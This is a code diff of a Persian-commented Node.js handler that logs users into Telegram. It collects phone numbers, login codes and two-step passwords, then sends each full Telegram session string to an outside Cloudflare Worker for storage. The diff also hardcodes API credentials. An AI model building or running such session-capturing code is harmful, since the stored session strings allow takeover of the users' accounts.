@@ -2,14 +2,13 @@
 const { TelegramClient } = require("telegram");
 const { StringSession } = require("telegram/sessions");
 const { Api } = require("telegram/tl");
-const input = require("input");
 
 // اطلاعات API
 const apiId = 20456083;
 const apiHash = '16db2b0cdd40db7c91511ca151115af5';
 
-// ذخیره sessionها
-const sessions = {};
+// آدرس Cloudflare Worker
+const WORKER_URL = 'https://tell.a09627301.workers.dev';
 
 module.exports = async (req, res) => {
   // تنظیم هدر برای CORS
@@ -37,22 +36,45 @@ module.exports = async (req, res) => {
     
     const { step, phone, code, password, phoneCodeHash, sessionId } = body;
 
-    if (!phone) {
+    // اگر sessionId وجود دارد، از Cloudflare Worker برای بررسی استفاده کن
+    if (sessionId) {
+      try {
+        const response = await fetch(`${WORKER_URL}/api/check-session`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({ sessionId })
+        });
+        
+        const data = await response.json();
+        
+        if (data.success) {
+          return res.status(200).json({
+            success: true,
+            message: "کاربر از قبل وارد شده است",
+            user: data.user,
+            sessionId: data.sessionId
+          });
+        }
+      } catch (error) {
+        console.error('Session check error:', error);
+        // ادامه به فرآیند لاگین معمول
+      }
+    }
+
+    if (!phone && step !== "checkPassword") {
       return res.status(400).json({ success: false, message: "شماره تلفن لازم است" });
     }
 
-    // اگر session برای این شماره وجود ندارد، ایجاد کن
-    if (!sessions[phone]) {
-      const stringSession = new StringSession("");
-      sessions[phone] = new TelegramClient(stringSession, apiId, apiHash, {
-        connectionRetries: 5,
-      });
-      
-      // اتصال کلاینت
-      await sessions[phone].connect();
-    }
-
-    const client = sessions[phone];
+    // ایجاد کلاینت تلگرام
+    const stringSession = new StringSession("");
+    const client = new TelegramClient(stringSession, apiId, apiHash, {
+      connectionRetries: 5,
+    });
+    
+    // اتصال کلاینت
+    await client.connect();
 
     if (step === "sendCode") {
       try {
@@ -111,15 +133,46 @@ module.exports = async (req, res) => {
           phone: user.phone
         };
         
-        // ذخیره session string برای استفاده بعدی
-        const sessionString = client.session.save();
-        
-        return res.status(200).json({ 
-          success: true, 
-          message: "ورود موفقیت‌آمیز بود",
-          user: userData,
-          sessionString: sessionString
-        });
+        // ذخیره session در Cloudflare D1
+        try {
+          const saveResponse = await fetch(`${WORKER_URL}/api/save-session`, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              phone: phone,
+              userData: userData,
+              sessionString: client.session.save()
+            })
+          });
+          
+          const saveData = await saveResponse.json();
+          
+          if (saveData.success) {
+            return res.status(200).json({ 
+              success: true, 
+              message: "ورود موفقیت‌آمیز بود",
+              user: userData,
+              sessionId: saveData.sessionId
+            });
+          } else {
+            return res.status(200).json({ 
+              success: true, 
+              message: "ورود موفقیت‌آمیز بود اما خطایی در ذخیره session رخ داد",
+              user: userData,
+              sessionId: null
+            });
+          }
+        } catch (saveError) {
+          console.error('Session save error:', saveError);
+          return res.status(200).json({ 
+            success: true, 
+            message: "ورود موفقیت‌آمیز بود اما خطایی در ذخیره session رخ داد",
+            user: userData,
+            sessionId: null
+          });
+        }
       } catch (error) {
         // اگر نیاز به رمز دومرحله‌ای باشد
         if (error.errorMessage === 'SESSION_PASSWORD_NEEDED') {
@@ -168,15 +221,46 @@ module.exports = async (req, res) => {
           phone: user.phone
         };
         
-        // ذخیره session string برای استفاده بعدی
-        const sessionString = client.session.save();
-        
-        return res.status(200).json({ 
-          success: true, 
-          message: "ورود موفقیت‌آمیز بود",
-          user: userData,
-          sessionString: sessionString
-        });
+        // ذخیره session در Cloudflare D1
+        try {
+          const saveResponse = await fetch(`${WORKER_URL}/api/save-session`, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              phone: phone,
+              userData: userData,
+              sessionString: client.session.save()
+            })
+          });
+          
+          const saveData = await saveResponse.json();
+          
+          if (saveData.success) {
+            return res.status(200).json({ 
+              success: true, 
+              message: "ورود موفقیت‌آمیز بود",
+              user: userData,
+              sessionId: saveData.sessionId
+            });
+          } else {
+            return res.status(200).json({ 
+              success: true, 
+              message: "ورود موفقیت‌آمیز بود اما خطایی در ذخیره session رخ داد",
+              user: userData,
+              sessionId: null
+            });
+          }
+        } catch (saveError) {
+          console.error('Session save error:', saveError);
+          return res.status(200).json({ 
+            success: true, 
+            message: "ورود موفقیت‌آمیز بود اما خطایی در ذخیره session رخ داد",
+            user: userData,
+            sessionId: null
+          });
+        }
       } catch (error) {
         console.error("Password check error:", error);
         return res.status(400).json({ 
